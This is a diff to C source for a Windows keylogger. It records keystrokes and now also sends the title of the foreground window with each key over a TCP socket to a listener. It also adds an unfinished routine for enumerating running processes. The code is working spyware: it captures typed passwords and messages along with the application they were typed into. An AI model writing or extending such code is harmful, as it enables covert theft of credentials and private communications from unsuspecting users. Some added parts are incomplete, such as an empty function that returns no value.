@@ -2,8 +2,10 @@
 #include <stdio.h>
 #include <windows.h>
 #include <psapi.h>
+#include <stdlib.h>
+#include <stdint.h>
 
-#define MSG_BUFF_LEN 5
+#define MSG_BUFF_LEN 15
 
 void vkey_to_char(int vKey, char buffer[MSG_BUFF_LEN]) {
     BYTE keyboardState[256];
@@ -45,12 +47,67 @@ BOOL WINAPI ConsoleHandler(DWORD signal) {
     return TRUE;
 }
 
+#define MAX_EXES 100
+
+typedef struct {
+    char exeList[MAX_EXES][MAX_PATH];
+    int exeCount;
+} ExeArr;
+
+BOOL checkIfWindowsChanged(ExeArr *exeArr, char lastList[MAX_EXES][MAX_PATH]) {
+    ;
+}
+
+BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lparam) {
+    // instead of LPARAM lparam, its ExeArr *exeArr, pointer to that struct
+    DWORD pid;
+    char name[MAX_PATH];
+
+    if (IsWindowVisible(hwnd)) {
+        // get process id for window
+        GetWindowThreadProcessId(hwnd, &pid);
+        HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+        if (hProc != NULL) {
+            if (GetModuleBaseNameA(hProc, NULL, name, sizeof(name)) > 0) {
+                ExeArr *data = (ExeArr *)lparam;  // cast type lparam into a pointer to ExeArr type
+                strcpy(data->exeList[data->exeCount], name);
+                data->exeCount++;
+            }
+            CloseHandle(hProc);
+        }
+        // printf("Window handle: %p\n", hwnd);
+    }
+    return TRUE;
+}
+
+char *handleFocusedWindow() {
+    char *titleBuff = malloc(512);
+    if (!titleBuff) return NULL;
+
+    HWND hwnd = GetForegroundWindow();
+    int length = GetWindowTextA(hwnd, titleBuff, 512);
+
+    if (length > 0) {
+        titleBuff[length] = '\0';  // ensure null termination
+    } else {
+        titleBuff[0] = '\0';
+    }
+
+    // printf("Current window - %s, length - %d\n", titleBuff, length);
+    return titleBuff;
+}
+
+
 int main() {
     FlushConsoleInputBuffer(GetStdHandle(STD_INPUT_HANDLE));
     SetConsoleCtrlHandler(ConsoleHandler, TRUE);  // run control c event handler
 
     WSADATA wsa;
-    WSAStartup(MAKEWORD(2, 2), &wsa);
+    int startupResult = WSAStartup(MAKEWORD(2, 2), &wsa);
+    if (startupResult != 0) {
+        printf("WSAStartup failed: %d\n", startupResult);
+        return 1;
+    }
 
     SOCKET client_socket;
     client_socket = socket(AF_INET, SOCK_STREAM, 0);
@@ -75,6 +132,7 @@ int main() {
     }
     
     char newMsgBuff[MSG_BUFF_LEN] = {0};
+    char *windowCapBuff;
     // char prevMsgBuff[MSG_BUFF_LEN] = {0};
 
     BYTE keyStates[256] = {0};
@@ -92,13 +150,21 @@ int main() {
 
                 if (vKey == VK_LCONTROL || vKey == VK_RCONTROL) {
                     strcpy(newMsgBuff, "\xC2\xA9");
-                    printf("Control key pressed!\n");
                 }
 
                 if (newMsgBuff[0] != '\0') {
                     // printf("Typed: %s\n", newMsgBuff);
                     // we send upon a detected key press
-                    send(client_socket, newMsgBuff, strlen(newMsgBuff), 0);
+                    windowCapBuff = handleFocusedWindow();
+                    uint8_t capLen = (uint8_t)strlen(windowCapBuff);
+                    uint8_t keyLen = (uint8_t)MSG_BUFF_LEN;
+
+                    send(client_socket, &capLen, 1, 0);
+                    send(client_socket, windowCapBuff, capLen, 0);
+
+                    send(client_socket, &keyLen, 1, 0);
+                    send(client_socket, newMsgBuff, keyLen, 0);
+                    printf("Caption: %s - StrLen: %d - CapLen: %d\n", windowCapBuff, strlen(windowCapBuff), capLen);
                 }
             } else if ((state & 0x8000) && keyStates[vKey]) {  // held down state
                 vkey_to_char(vKey, newMsgBuff);  // modify vkey if necessary and add to buffer before sending
@@ -110,7 +176,17 @@ int main() {
                 if (newMsgBuff[0] != '\0' && holdClock > 30) {
                     // printf("Typed: %s\n", newMsgBuff);
                     // we send upon a detected key press
-                    send(client_socket, newMsgBuff, strlen(newMsgBuff), 0);
+                    // send(client_socket, newMsgBuff, strlen(newMsgBuff), 0);
+                    windowCapBuff = handleFocusedWindow();
+                    uint8_t capLen = (uint8_t)strlen(windowCapBuff);
+                    uint8_t keyLen = (uint8_t)MSG_BUFF_LEN;
+
+                    send(client_socket, &capLen, 1, 0);
+                    send(client_socket, windowCapBuff, capLen, 0);
+
+                    send(client_socket, &keyLen, 1, 0);
+                    send(client_socket, newMsgBuff, keyLen, 0);
+                    printf("Caption: %s - Len: %d\n", newMsgBuff, strlen(newMsgBuff));
                 }
                 holdClock++;
             } else if (!(state & 0x8000) && keyStates[vKey]) {
@@ -118,8 +194,18 @@ int main() {
                 holdClock = 0;
             }
         }
+
+        // handleFocusedWindow();
+        
+        // ExeArr exeArr = {0};  // zero-initialize count and the array
+        // Make copy exeList to compare with next iteration
+        // char lastList[MAX_EXES][MAX_PATH];
+        // EnumWindows(EnumWindowsProc, (LPARAM)&exeArr);  // have to cast exeArr type into LPARAM type
+        // checkIfWindowsChanged(&exeArr, lastList);
+        // for (int i = 0; i < exeArr.exeCount; i++) {
+        //     printf("EXE: %s\n", exeArr.exeList[i]);
+        // }
         Sleep(10);  // 10ms delay
     }
-
     return 0;
 }
